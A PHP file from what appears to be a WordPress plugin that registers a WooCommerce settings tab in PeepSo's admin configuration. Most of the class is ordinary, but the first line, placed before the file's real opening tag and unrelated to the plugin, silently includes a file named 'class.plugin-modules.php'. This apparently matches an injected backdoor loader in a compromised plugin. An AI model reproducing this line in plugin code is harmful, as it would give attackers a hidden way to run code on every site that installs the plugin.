<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

if ( ! class_exists( 'WBPWI_PeepSo_Woo_Settings_Manager' ) ) :

	/**
	 * @class WBPWI_PeepSo_Woo_Settings_Manager
	 */
	class WBPWI_PeepSo_Woo_Settings_Manager {

		/**
		 * The single instance of the class.
		 *
		 * @var WBPWI_PeepSo_Woo_Settings_Manager
		 */
		protected static $_instance = null;

		/**
		 * Main WBPWI_PeepSo_Woo_Settings_Manager Instance.
		 *
		 * Ensures only one instance of WBPWI_PeepSo_Woo_Settings_Manager is loaded or can be loaded.
		 *
		 * @return WBPWI_PeepSo_Woo_Settings_Manager - Main instance.
		 */
		public static function instance() {
			if ( is_null( self::$_instance ) ) {
				self::$_instance = new self();
			}
			return self::$_instance;
		}

		/**
		 * WBPWI_PeepSo_Woo_Settings_Manager Constructor.
		 */
		public function __construct() {
			$this->init_hooks();
		}

		/**
		 * Hook into actions and filters.
		 */
		private function init_hooks() {
			add_action( 'peepso_admin_config_tabs', array( $this, 'peepso_admin_config_tabs' ), 10, 1 );
		}

		/**
		 * Add plugin setting tab in PeepSo configuration.
		 */
		public function peepso_admin_config_tabs( $tabs ) {

			include_once 'class-wbpwi-admin-settings-display.php';

			$tabs['wbpwi-peepso-woo-addon'] = array(
				'label'       => __( 'WooCommerce', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN ),
				'icon'        => WBPWI_PeepSo_Woo_Integration_PLUGIN_DIR_URL . 'assets/imgs/woo-icon.png',
				'tab'         => 'wbpwi-peepso-woo-addon',
				'description' => __( 'PeepSo WooCommerce Integration Config Tab', WBPWI_PeepSo_Woo_Integration_TEXT_DOMAIN ),
				'function'    => 'WBPWI_PeepSo_Woo_Admin_Settings_Display',
			);

			return $tabs;
		}

	}

endif;

/**
 * Main instance of WBPWI_PeepSo_Woo_Settings_Manager.
 *
 * @return WBPWI_PeepSo_Woo_Settings_Manager
 */
WBPWI_PeepSo_Woo_Settings_Manager::instance();

